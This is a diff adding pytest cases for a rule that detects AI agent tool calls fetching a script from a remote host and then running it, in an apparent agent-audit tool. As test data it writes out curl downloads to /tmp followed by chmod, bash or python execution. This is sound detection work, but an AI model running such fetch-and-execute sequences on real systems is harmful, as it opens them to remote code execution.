@@ -8,6 +8,8 @@ read → git push, and staged downloads from public hosts → execution.
 
 from __future__ import annotations
 
+import pytest
+
 from agentmetry.core.audit.detection.rules import (
     rule_credential_read_then_cloud_api,
     rule_dotfile_read_then_git_push,
@@ -145,6 +147,25 @@ def test_hf_raw_fetch_then_python_fires():
         _ev("Bash", command="python3 payload.py", event_id="b"),
     ]
     assert rule_remote_staging_then_execute(events) != []
+
+
+@pytest.mark.parametrize("host", ["downloads.example.invalid", "raw.githubusercontent.com"])
+def test_staging_fetch_then_permission_change_is_quiet(host):
+    events = [
+        _ev("Bash", command=f"curl -o /tmp/demo.sh https://{host}/demo.sh", event_id="a"),
+        _ev("Bash", command="chmod +x /tmp/demo.sh", event_id="b"),
+    ]
+    assert rule_remote_staging_then_execute(events) == []
+
+
+def test_staging_match_reports_shared_basename():
+    events = [
+        _ev("Bash", command="curl -o /tmp/demo.sh https://downloads.example.invalid/demo.sh", event_id="a"),
+        _ev("Bash", command="bash /other/demo.sh", event_id="b"),
+    ]
+    (detection,) = rule_remote_staging_then_execute(events)
+    assert detection.event_ids == ["a", "b"]
+    assert "same basename" in detection.summary
 
 
 def test_staging_pipe_to_shell_is_not_double_counted_by_sequence():
